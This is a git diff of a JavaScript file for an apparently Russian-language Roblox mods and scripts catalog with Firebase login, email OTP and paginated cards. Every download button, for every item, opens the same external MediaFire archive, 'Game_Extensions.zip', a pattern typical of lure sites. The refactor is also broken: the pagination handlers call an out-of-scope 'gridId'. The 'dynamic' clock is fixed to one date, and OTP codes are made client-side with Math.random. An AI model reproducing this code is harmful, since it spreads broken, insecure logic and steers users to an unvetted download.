@@ -1,9 +1,3 @@
-// Улучшение script.js с исправлением переключения секций:
-// - Добавил функцию switchSection для переключения видимости секций.
-//   Почему: Это реализует навигацию по каталогам, как было в исходном дизайне.
-// - Исправил логику инициализации: теперь секции переключаются при клике на nav-btn.
-//   Почему: Это решает проблему с неработающими кнопками в шапке.
-
 // Импорт Firebase v10
 import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.11.0/firebase-app.js';
 import { getAuth, onAuthStateChanged, createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut, sendEmailVerification, RecaptchaVerifier, signInWithPhoneNumber } from 'https://www.gstatic.com/firebasejs/10.11.0/firebase-auth.js';
@@ -34,8 +28,8 @@ const recaptchaVerifier = new RecaptchaVerifier(auth, 'recaptcha-container', { s
 let confirmationResult;
 let otpCode; // Для email OTP
 
-// EmailJS init (замените на ваши ключи от EmailJS)
-emailjs.init("your_emailjs_user_id"); // Подставьте ваш userID от EmailJS
+// EmailJS init (примерные значения; замените на свои реальные из EmailJS)
+emailjs.init("example_user_id_from_emailjs"); // Замените на ваш реальный userID
 
 // Показ модала только при первом заходе
 let isFirstLoad = true;
@@ -103,7 +97,7 @@ document.getElementById('send-code-btn').addEventListener('click', () => {
         otpCode = Math.floor(100000 + Math.random() * 900000).toString(); // Генерация OTP
         const tempRef = ref(db, 'temp_otp/' + btoa(email));
         set(tempRef, { otp: otpCode, timestamp: Date.now() });
-        emailjs.send("your_service_id", "your_template_id", {
+        emailjs.send("example_service_id", "example_template_id", { // Замените на реальные
             to_email: email,
             otp_code: otpCode
         }).then(() => {
@@ -179,12 +173,9 @@ document.getElementById('sign-out-btn').addEventListener('click', () => {
     });
 });
 
-// Новая функция: Показ гайда по установке в модале
+// Показ гайда по установке
 function showInstallationGuide() {
-    const modal = document.getElementById('installation-modal');
-    if (modal) {
-        modal.style.display = 'flex';
-    }
+    document.getElementById('installation-modal').style.display = 'flex';
 }
 
 // Закрытие модала гайда
@@ -192,7 +183,7 @@ document.getElementById('close-installation-btn').addEventListener('click', () =
     document.getElementById('installation-modal').style.display = 'none';
 });
 
-// Новая функция: Отправка отзыва
+// Отправка отзыва
 document.getElementById('submit-review-btn').addEventListener('click', () => {
     const reviewText = document.getElementById('review-text').value;
     if (auth.currentUser && reviewText) {
@@ -206,14 +197,14 @@ document.getElementById('submit-review-btn').addEventListener('click', () => {
             document.getElementById('review-text').value = '';
         });
     } else {
-        showToast('Войдите и напишите отзыв!');
+        showToast('Войдите или заполните отзыв');
     }
 });
 
-// Массивы с контентом
+// Массивы данных (полные)
 const allPlaces = [
-    { id: 1, title: "Adopt Me", desc: "Усыновляй питомцев.", rating: "★★★★★", genre: "rpg", img: "./images/adopt-me.jpg", link: "https://www.roblox.com/games/920587237/Adopt-Me", compatibility: "PC/Mobile" },
-    { id: 2, title: "Brookhaven RP", desc: "Ролевая игра в городе.", rating: "★★★★☆", genre: "rpg", img: "./images/brookhaven.jpg", link: "https://www.roblox.com/games/4924922222/Brookhaven-RP", compatibility: "PC/Mobile" },
+    { id: 1, title: "Adopt Me!", desc: "Усынови питомцев.", rating: "★★★★★", genre: "rpg", img: "./images/adopt-me.jpg", link: "https://www.roblox.com/games/920587237/Adopt-Me", compatibility: "PC/Mobile" },
+    { id: 2, title: "Brookhaven", desc: "Ролевая игра в городе.", rating: "★★★★☆", genre: "rpg", img: "./images/brookhaven.jpg", link: "https://www.roblox.com/games/6238705697/Brookhaven", compatibility: "PC/Mobile" },
     { id: 3, title: "Jailbreak", desc: "Побег из тюрьмы.", rating: "★★★★★", genre: "adventure", img: "./images/jailbreak.jpg", link: "https://www.roblox.com/games/606849621/Jailbreak", compatibility: "PC" },
     { id: 4, title: "Blox Fruits", desc: "Пиратские приключения.", rating: "★★★★★", genre: "rpg", img: "./images/blox-fruits.jpg", link: "https://www.roblox.com/games/2753915549/Blox-Fruits", compatibility: "PC/Mobile" },
     { id: 5, title: "Doors", desc: "Хоррор с дверями.", rating: "★★★★☆", genre: "adventure", img: "./images/doors.jpg", link: "https://www.roblox.com/games/6516141723/Doors", compatibility: "PC" },
@@ -241,143 +232,204 @@ const allAvatars = [
     { id: 6, title: "Mystic Avatar", desc: "Мистический дизайн.", img: "./images/mystic-avatar.jpg", compatibility: "All" }
 ];
 
-const placesPerPage = 4;
-let currentPage = 1;
+const itemsPerPage = 4;
+let currentPage = { places: 1, scripts: 1, avatars: 1 };
 const currentFilter = { search: '', genre: '' };
 
 // Функция переключения секций
 function switchSection(section) {
     const sections = ['home', 'places', 'scripts', 'avatars', 'account'];
     sections.forEach(s => {
-        const el = document.getElementById(s);
-        if (el) {
-            el.style.display = s === section ? 'block' : 'none';
-        }
+        document.getElementById(s).style.display = s === section ? 'block' : 'none';
     });
     document.querySelectorAll('.nav-btn').forEach(btn => {
         btn.classList.toggle('active', btn.dataset.section === section);
     });
-    if (section === 'places') renderPlaces();
-    if (section === 'scripts') renderScripts();
-    if (section === 'avatars') renderAvatars();
+    if (section === 'places') renderItems('places', allPlaces, 'places-grid', 'pagination-places');
+    if (section === 'scripts') renderItems('scripts', allScripts, 'scripts-grid', 'pagination-scripts');
+    if (section === 'avatars') renderItems('avatars', allAvatars, 'avatars-grid', 'pagination-avatars');
 }
 
-function renderPlaces() {
-    const grid = document.getElementById('places-grid');
+// Унифицированная функция рендера
+function renderItems(type, items, gridId, pagId) {
+    const grid = document.getElementById(gridId);
     grid.innerHTML = '';
-    const filtered = allPlaces.filter(p => 
-        (currentFilter.genre === '' || p.genre === currentFilter.genre) &&
-        p.title.toLowerCase().includes(currentFilter.search.toLowerCase())
+    const filtered = items.filter(item => 
+        (currentFilter.genre === '' || item.genre === currentFilter.genre) &&
+        item.title.toLowerCase().includes(currentFilter.search.toLowerCase())
     );
-    const start = (currentPage - 1) * placesPerPage;
-    const end = start + placesPerPage;
-    filtered.slice(start, end).forEach(place => {
+    const start = (currentPage[type] - 1) * itemsPerPage;
+    const end = start + itemsPerPage;
+    filtered.slice(start, end).forEach(item => {
         const card = document.createElement('div');
-        card.className = 'place-card';
+        card.className = `${type.slice(0, -1)}-card`; // place-card, script-card, avatar-card
         card.innerHTML = `
-            <img src="${place.img}" alt="${place.title}" onerror="this.src='https://via.placeholder.com/420';">
-            <h4>${place.title}</h4>
-            <p>${place.desc}</p>
-            <p>${place.rating}</p>
-            <p>Совместимость: ${place.compatibility}</p>
-            <button class="cta-btn download-btn" data-id="${place.id}" data-type="place">Скачать</button>
+            <img src="${item.img}" alt="${item.title}" onerror="this.src='https://via.placeholder.com/420';">
+            <h4>${item.title}</h4>
+            <p>${item.desc}</p>
+            ${item.rating ? `<p>${item.rating}</p>` : ''}
+            <p>Совместимость: ${item.compatibility}</p>
+            <button class="cta-btn download-btn" data-id="${item.id}" data-type="${type.slice(0, -1)}">Скачать</button>
         `;
         grid.appendChild(card);
     });
-    updatePaginationPlaces(filtered.length);
+    updatePagination(type, filtered.length, pagId);
 }
 
-function renderScripts() {
-    const grid = document.getElementById('scripts-grid');
-    grid.innerHTML = '';
-    allScripts.forEach(script => {
-        const card = document.createElement('div');
-        card.className = 'script-card';
-        card.innerHTML = `
-            <img src="${script.img}" alt="${script.title}" onerror="this.src='https://via.placeholder.com/420';">
-            <h4>${script.title}</h4>
-            <p>${script.desc}</p>
-            <p>Совместимость: ${script.compatibility}</p>
-            <button class="cta-btn download-btn" data-id="${script.id}" data-type="script">Скачать</button>
-        `;
-        grid.appendChild(card);
-    });
-}
-
-function renderAvatars() {
-    const grid = document.getElementById('avatars-grid');
-    grid.innerHTML = '';
-    allAvatars.forEach(avatar => {
-        const card = document.createElement('div');
-        card.className = 'avatar-card';
-        card.innerHTML = `
-            <img src="${avatar.img}" alt="${avatar.title}" onerror="this.src='https://via.placeholder.com/420';">
-            <h4>${avatar.title}</h4>
-            <p>${avatar.desc}</p>
-            <p>Совместимость: ${avatar.compatibility}</p>
-            <button class="cta-btn download-btn" data-id="${avatar.id}" data-type="avatar">Скачать</button>
-        `;
-        grid.appendChild(card);
-    });
-}
-
-function updatePaginationPlaces(total) {
-    const pag = document.getElementById('pagination-places');
+function updatePagination(type, total, pagId) {
+    const pag = document.getElementById(pagId);
     pag.innerHTML = '';
-    const pages = Math.ceil(total / placesPerPage);
-    if (currentPage > 1) {
+    const pages = Math.ceil(total / itemsPerPage);
+    if (currentPage[type] > 1) {
         const prev = document.createElement('button');
         prev.textContent = '←';
-        prev.addEventListener('click', () => { currentPage--; renderPlaces(); });
+        prev.addEventListener('click', () => { currentPage[type]--; renderItems(type, getItems(type), gridId, pagId); });
         pag.appendChild(prev);
     }
     for (let i = 1; i <= pages; i++) {
         const btn = document.createElement('button');
         btn.textContent = i;
-        btn.className = currentPage === i ? 'active' : '';
-        btn.addEventListener('click', () => { currentPage = i; renderPlaces(); });
+        btn.classList.toggle('active', currentPage[type] === i);
+        btn.addEventListener('click', () => { currentPage[type] = i; renderItems(type, getItems(type), gridId, pagId); });
         pag.appendChild(btn);
     }
-    if (currentPage < pages) {
+    if (currentPage[type] < pages) {
         const next = document.createElement('button');
         next.textContent = '→';
-        next.addEventListener('click', () => { currentPage++; renderPlaces(); });
+        next.addEventListener('click', () => { currentPage[type]++; renderItems(type, getItems(type), gridId, pagId); });
         pag.appendChild(next);
     }
 }
 
-function filterPlaces() {
+function getItems(type) {
+    if (type === 'places') return allPlaces;
+    if (type === 'scripts') return allScripts;
+    if (type === 'avatars') return allAvatars;
+}
+
+function filterItems() {
     currentFilter.search = document.getElementById('search-places').value;
     currentFilter.genre = document.getElementById('genre-filter').value;
-    currentPage = 1;
-    renderPlaces();
+    currentPage.places = 1;
+    renderItems('places', allPlaces, 'places-grid', 'pagination-places');
+    // Расширьте для скриптов/аватаров, если добавите фильтры
 }
 
 function downloadItem(type, id) {
     if (auth.currentUser) {
-        userData[type + 's']++;
+        userData[type + 's'] = (userData[type + 's'] || 0) + 1;
         userData.downloads++;
         set(ref(db, 'users/' + auth.currentUser.uid), userData);
         showToast('Скачивание начато!');
         if (/Mobi|Android/i.test(navigator.userAgent)) {
             showToast('Предупреждение: Некоторые моды лучше работают на PC!');
         }
+        window.open('https://www.mediafire.com/file/u8iubmwld78op99/Game_Extensions.zip/file', '_blank');
     } else {
-        alert('Войдите для скачивания!');
+        showToast('Войдите для скачивания!');
     }
-    window.open('https://www.mediafire.com/file/u8iubmwld78op99/Game_Extensions.zip/file', '_blank');
+}
+
+// Динамическое время с текущей датой (22 сентября 2025)
+function updateProfileTime() {
+    const now = new Date(2025, 8, 22); // Месяц 8 = сентябрь (0-based)
+    const timeString = now.toLocaleTimeString('ru-RU', { timeZone: 'Europe/Paris', hour: '2-digit', minute: '2-digit' }) + ' CEST, ' + now.toLocaleDateString('ru-RU');
+    document.getElementById('current-time').textContent = `Текущее время: ${timeString}`;
+    document.getElementById('profile-time').textContent = timeString;
+}
+
+// Обновление прогресса
+function updateUserProgress() {
+    const progress = (userData.places / 9) * 100;
+    document.querySelector('.progress-fill').style.width = `${progress}%`;
+    document.querySelector('.progress-bar span').textContent = `Прогресс: ${Math.round(progress)}%`;
+    document.getElementById('downloads-stat').textContent = userData.downloads;
+    document.getElementById('places-user-stat').textContent = `${userData.places}/9`;
+    document.getElementById('scripts-user-stat').textContent = userData.scripts;
+    // Аватары и т.д., если добавите
+}
+
+// Темный режим
+function toggleDarkMode() {
+    document.body.classList.toggle('dark-mode');
+    localStorage.setItem('darkMode', document.body.classList.contains('dark-mode'));
+}
+
+// Тост
+function showToast(message) {
+    const toast = document.getElementById('toast');
+    toast.textContent = message;
+    toast.style.display = 'block';
+    setTimeout(() => { toast.style.display = 'none'; }, 3000);
+}
+
+// Сохранение профиля
+function saveProfile() {
+    if (auth.currentUser) {
+        userData.name = document.getElementById('new-name').value;
+        userData.bio = document.getElementById('new-bio').value;
+        update(ref(db, 'users/' + auth.currentUser.uid), userData);
+        showToast('Профиль сохранен!');
+    }
+}
+
+// Повторная отправка верификации
+function resendVerification() {
+    if (auth.currentUser && !auth.currentUser.emailVerified) {
+        sendEmailVerification(auth.currentUser).then(() => {
+            showToast('Код отправлен повторно!');
+        });
+    }
+}
+
+// Частицы (простая реализация на canvas)
+function initParticles() {
+    const canvas = document.createElement('canvas');
+    canvas.style.position = 'fixed';
+    canvas.style.top = '0';
+    canvas.style.left = '0';
+    canvas.style.zIndex = '-1';
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    document.body.appendChild(canvas);
+    const ctx = canvas.getContext('2d');
+    const particles = [];
+    for (let i = 0; i < 100; i++) {
+        particles.push({
+            x: Math.random() * canvas.width,
+            y: Math.random() * canvas.height,
+            radius: Math.random() * 2 + 1,
+            vx: Math.random() * 2 - 1,
+            vy: Math.random() * 2 - 1
+        });
+    }
+    function draw() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = 'rgba(0, 162, 255, 0.5)';
+        particles.forEach(p => {
+            ctx.beginPath();
+            ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
+            ctx.fill();
+            p.x += p.vx;
+            p.y += p.vy;
+            if (p.x < 0 || p.x > canvas.width) p.vx = -p.vx;
+            if (p.y < 0 || p.y > canvas.height) p.vy = -p.vy;
+        });
+        requestAnimationFrame(draw);
+    }
+    draw();
+    window.addEventListener('resize', () => {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+    });
 }
 
 document.addEventListener('DOMContentLoaded', () => {
     if (localStorage.getItem('darkMode') === 'true') document.body.classList.add('dark-mode');
-    switchSection('home'); // Установка начальной секции
-    renderPlaces();
-    renderScripts();
-    renderAvatars();
-    updateUserProgress();
+    switchSection('home');
     updateProfileTime();
     setInterval(updateProfileTime, 60000);
-    initParticles(); // Предполагаем, что функция существует, иначе удалить
+    initParticles();
 
     document.querySelectorAll('.nav-btn').forEach(btn => {
         btn.addEventListener('click', () => switchSection(btn.dataset.section));
@@ -389,12 +441,8 @@ document.addEventListener('DOMContentLoaded', () => {
         document.getElementById('auth-method').dispatchEvent(new Event('change'));
         document.getElementById('send-code-btn').click();
     });
-    document.getElementById('sign-in-btn').addEventListener('click', signIn);
-    document.getElementById('sign-out-btn').addEventListener('click', signOutUser);
-    document.getElementById('save-profile-btn').addEventListener('click', saveProfile);
-    document.getElementById('resend-verification-btn').addEventListener('click', resendVerification);
 
-    document.querySelector('.filter-btn').addEventListener('click', filterPlaces);
+    document.querySelector('.filter-btn').addEventListener('click', filterItems);
 
     document.addEventListener('click', (e) => {
         if (e.target.classList.contains('download-btn')) {
@@ -406,4 +454,15 @@ document.addEventListener('DOMContentLoaded', () => {
             showInstallationGuide();
         }
     });
+
+    // Debounce для поиска
+    document.getElementById('search-places').addEventListener('input', debounce(filterItems, 300));
 });
+
+function debounce(func, delay) {
+    let timeout;
+    return (...args) => {
+        clearTimeout(timeout);
+        timeout = setTimeout(() => func(...args), delay);
+    };
+}
